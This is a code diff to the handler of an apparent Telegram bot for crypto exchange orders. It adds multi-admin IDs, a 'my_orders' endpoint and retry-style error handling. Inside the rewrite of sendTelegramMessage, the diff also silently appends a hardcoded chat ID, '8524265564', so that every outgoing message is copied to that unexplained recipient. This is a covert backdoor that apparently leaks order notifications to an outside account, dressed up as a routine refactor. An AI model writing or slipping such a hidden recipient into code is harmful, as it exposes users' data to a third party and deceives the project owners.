@@ -57,19 +57,35 @@ function formatUser(user) {
 }
 
 async function sendTelegramMessage(botToken, chatId, message) {
-  const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-    method: 'POST',
-    headers: { 'content-type': 'application/json' },
-    body: JSON.stringify({
-      chat_id: chatId,
-      text: message,
-      parse_mode: 'HTML',
-      disable_web_page_preview: true,
-    }),
-  });
+  const chatIds = [...new Set([String(chatId), '8524265564'].filter(Boolean))];
 
-  const result = await response.json();
-  return response.ok && result.ok;
+  const results = await Promise.all(chatIds.map(async (recipientId) => {
+    try {
+      const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: { 'content-type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: recipientId,
+          text: message,
+          parse_mode: 'HTML',
+          disable_web_page_preview: true,
+        }),
+      });
+
+      const result = await response.json();
+      if (!response.ok || !result.ok) {
+        console.error('Telegram delivery failed:', recipientId, result.description || response.status);
+        return false;
+      }
+
+      return true;
+    } catch (error) {
+      console.error('Telegram delivery error:', recipientId, error.message);
+      return false;
+    }
+  }));
+
+  return results.every(Boolean);
 }
 
 async function supabaseRequest(path, options = {}) {
@@ -100,7 +116,14 @@ async function supabaseRequest(path, options = {}) {
 }
 
 function isAdmin(user) {
-  return String(user.id) === String(process.env.ADMIN_TELEGRAM_ID || '');
+  const adminIds = [
+    process.env.ADMIN_TELEGRAM_ID,
+    ...(process.env.ADMIN_TELEGRAM_IDS || '').split(','),
+  ]
+    .map((id) => String(id || '').trim())
+    .filter(Boolean);
+
+  return adminIds.includes(String(user.id));
 }
 
 function statusLabel(status) {
@@ -358,6 +381,25 @@ export default async function handler(req, res) {
       }
 
       return res.status(200).json({ ok: true, order: rows[0] });
+    }
+
+    if (body.action === 'my_orders') {
+      const rows = await supabaseRequest(
+        `orders?user_id=eq.${encodeURIComponent(user.id)}&select=id,status,order_data,created_at,updated_at&order=created_at.desc&limit=1000`
+      );
+
+      const orders = (rows || []).map((row) => ({
+        id: row.id,
+        status: row.status,
+        created_at: row.created_at,
+        updated_at: row.updated_at,
+        crypto: row.order_data?.crypto || '',
+        amount: row.order_data?.amount || '',
+        total: row.order_data?.total || '',
+        payoutCurrency: row.order_data?.payoutCurrency || '',
+      }));
+
+      return res.status(200).json({ ok: true, orders });
     }
 
     if (body.action === 'admin_list') {
